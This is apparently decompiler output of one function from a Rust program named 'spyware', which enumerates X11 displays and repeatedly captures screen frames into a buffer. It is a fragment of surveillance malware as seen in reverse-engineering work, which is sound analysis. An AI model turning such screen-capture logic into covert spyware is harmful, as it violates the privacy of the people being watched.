
  int128_t* spyware::actions::screenshot_actions::get_screenshot_request::h77f87121c90614c4(int128_t* arg1)

{
    int64_t var_130 = 0;
    int64_t var_128 = 8;
    int64_t var_120 = 0;
    char const (** const var_178)[0x82];
    char const* const var_d8;
    int64_t var_b8;
    
    if (core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4)
    {
        var_178 = &data_4b9f08;
        int64_t var_170_1 = 1;
        int64_t var_168_1 = 8;
        int128_t var_160_1 = {0};
        int64_t rax_1 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9f38);
        var_d8 = "spyware::actions::screenshot_act…";
        int64_t var_d0_1 = 0x24;
        char const* const var_c8_1 = "spyware::actions::screenshot_act…";
        int64_t var_c0_1 = 0x24;
        var_b8 = rax_1;
        log::__private_api::log::h13afddf373bd7d7f(&var_178, 4, &var_d8);
    }
    
    scrap::common::x11::Display::all::h028c2cd890d978af(&var_178);
    void var_48;
    core::result::Result$LT$T$C$E$GT$::expect::hefa40e5ef76aaa1f(&var_48, &var_178);
    void var_68;
    _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::hb4b0dd109b77bc21(&var_68, &var_48);
    int128_t var_90;
    _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h5ea6a75bdaeb1c6c(&var_90, &var_68);
    char var_7c;
    
    if (var_7c == 2)
    {
        core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$scrap..common..x11..Display$GT$$GT$::h7f2fe04fdf4c91d5(&var_68);
        arg1[1] = var_120;
        *arg1 = var_130;
        *(arg1 + 0x18) = -0x8000000000000000;
        return arg1;
    }
    
    int128_t zmm0 = var_90;
    var_178 = &data_4b9f18;
    int64_t var_170_2 = 1;
    int64_t var_168_2 = 8;
    uint128_t var_160_2 = {0};
    std::io::stdio::_print::h17d6c2a1d6a6f99e(&var_178);
    int64_t var_80;
    int64_t var_c8_2 = var_80;
    var_d8 = zmm0;
    scrap::common::x11::Capturer::new::he891e0d15b72a285(&var_178, &var_d8);
    core::result::Result$LT$T$C$E$GT$::expect::h742920b880be4ab9(&var_d8, &var_178);
    uint128_t zmm1 = _mm_unpacklo_epi32(_mm_unpacklo_epi16(*var_b8[4], 0), 0);
    uint64_t var_180;
    uint128_t var_f0;
    
    while (true)
    {
        int64_t var_118;
        scrap::common::x11::Capturer::frame::hab680e12d159cf27(&var_118, &var_d8);
        int64_t rsi_6 = var_118;
        uint64_t var_110;
        
        if (!rsi_6)
        {
            var_180 = var_110;
            
            if (std::io::error::Error::kind::h7f0d5435ec1cf07f(var_110) != 0xd)
                break;
            
            std::thread::sleep::h1a6eeffe1c923e1f(0, 0xfe502a);
            core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&var_180);
        }
        else
        {
            _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4bd00d1297ead281(
                &var_f0, rsi_6, var_110);
            int64_t var_e0;
            int64_t var_168_3 = var_e0;
            var_178 = var_f0;
            var_160_2 = zmm1;
            alloc::vec::Vec$LT$T$C$A$GT$::push::he3b9a1547804d23c(&var_130, &var_178);
        }
    }
    
    var_f0 = &var_180;
    *var_f0[8] =
        _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
    var_178 = &data_4b9f28;
    int64_t var_170_3 = 1;
    *var_160_2[8] = 0;
    uint128_t* var_168_4 = &var_f0;
    var_160_2 = 1;
    core::panicking::panic_fmt::he33b64161001a34b(&var_178);
    /* no return */
}
